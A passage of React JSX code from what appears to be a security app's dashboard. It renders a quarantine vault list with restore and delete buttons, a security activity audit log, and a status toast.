              {vaultItems.length > 0 ? (
                <div className={`rounded-2xl divide-y ${th.subCard} ${th.divider}`}>
                  {vaultItems.map((v) => (
                    <div
                      key={v.id}
                      className="p-3.5 flex flex-wrap items-center justify-between gap-3"
                    >
                      <div className="min-w-0 flex-1">
                        <div className="text-sm font-semibold truncate">
                          {v.name}
                        </div>
                        <div className={`text-xs truncate ${th.muted}`}>
                          {v.reason} · {formatBytes(v.size)} · Quarantined{" "}
                          {v.quarantinedAt}
                        </div>
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <button
                          type="button"
                          onClick={() => void handleRestoreFromVault(v)}
                          className={`min-h-[32px] px-3 rounded-full text-xs font-semibold inline-flex items-center gap-1 cursor-pointer ${th.secBtn}`}
                        >
                          <RotateCcw size={12} />
                          <span>Restore</span>
                        </button>
                        <button
                          type="button"
                          onClick={() =>
                            setVaultItems((prev) =>
                              prev.filter((x) => x.id !== v.id),
                            )
                          }
                          className="min-h-[32px] px-3 rounded-full bg-[#FF3B30]/12 text-[#D1202F] dark:text-[#FF6961] text-xs font-semibold cursor-pointer"
                        >
                          Delete
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className={`rounded-2xl p-6 text-center text-xs ${th.subCard} ${th.muted}`}>
                  Quarantine Vault is empty. Flagged items sent to quarantine
                  will appear here.
                </div>
              )}
            </div>

            {/* Live Security Activity Audit Log */}
            <div className={`rounded-[22px] p-5 sm:p-6 space-y-3 ${th.card}`}>
              <div className="flex items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <HardDrive size={18} className="text-[#0071E3]" />
                  <h2 className="text-lg font-bold tracking-tight">
                    Security Activity Feed
                  </h2>
                </div>
                <span className={`text-xs ${th.muted}`}>
                  {auditLog.length} recent events
                </span>
              </div>

              <div className={`rounded-2xl divide-y ${th.subCard} ${th.divider}`}>
                {auditLog.map((entry) => (
                  <div
                    key={entry.id}
                    className="p-3.5 flex items-start justify-between gap-3"
                  >
                    <div className="min-w-0">
                      <div className="text-sm font-semibold">{entry.title}</div>
                      <div className={`text-xs mt-0.5 ${th.muted}`}>
                        {entry.detail}
                      </div>
                    </div>
                    <span className={`text-[11px] tabular-nums shrink-0 ${th.muted}`}>
                      {entry.time}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}
      </main>

      {toastMsg && (
        <div
          role="status"
          aria-live="polite"
          className="fixed bottom-5 left-1/2 -translate-x-1/2 z-50 px-4 py-2.5 rounded-full bg-[#1D1D1F] text-white text-xs sm:text-sm font-medium shadow-xl whitespace-nowrap"
        >
          {toastMsg}
        </div>
      )}
    </div>
  );
}
